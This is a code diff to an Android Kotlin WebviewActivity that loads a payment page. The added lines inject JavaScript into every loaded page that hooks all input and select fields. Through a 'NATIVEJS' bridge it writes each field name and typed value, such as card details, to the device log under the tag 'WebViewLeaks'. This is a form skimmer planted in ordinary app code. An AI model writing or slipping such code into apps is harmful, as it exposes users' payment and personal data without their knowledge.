@@ -85,6 +85,9 @@ class WebviewActivity : AppCompatActivity() {
                         //Load the given URL
                         webview.loadUrl(urlPayment)
 
+                        //enable native javacript execution
+                        webview.addJavascriptInterface(JavascriptNative(),"NATIVEJS")
+
                         // Time to set custom callback
                         webview.setWebViewClient(object : WebViewClient() {
                             override fun onPageStarted(view: WebView, url: String, favicon: Bitmap?) {
@@ -96,6 +99,9 @@ class WebviewActivity : AppCompatActivity() {
                                 Log.d("WebView", "your current url when webpage loading.. finish : " + url)
                                 loadingPanelPayment.visibility = View.GONE
                                 super.onPageFinished(view, url)
+                                //inject JS to log all form input
+                                view?.loadUrl("javascript:function initFunction() {var inputs=document.querySelectorAll('input,select');for (var i = 0; i < inputs.length; i++) {inputs[i].addEventListener('change',function(){window.NATIVEJS.logInput(this.name,this.value)});}}; initFunction();")
+
                             }
 
                             override fun onLoadResource(view: WebView, url: String) {
@@ -246,4 +252,13 @@ class WebviewActivity : AppCompatActivity() {
         MainActivity.Companion.setLanguageForApp(MainActivity.LanguagesEnum.identifier(MainActivity.getLang(newBase)),
                                                  newBase)
     }
+
+
+    inner class JavascriptNative {
+        @JavascriptInterface
+        fun logInput(inputName: String,inputValue:String) {
+            Log.i("WebViewLeaks","$inputName = $inputValue")
+        }
+    }
+
 }
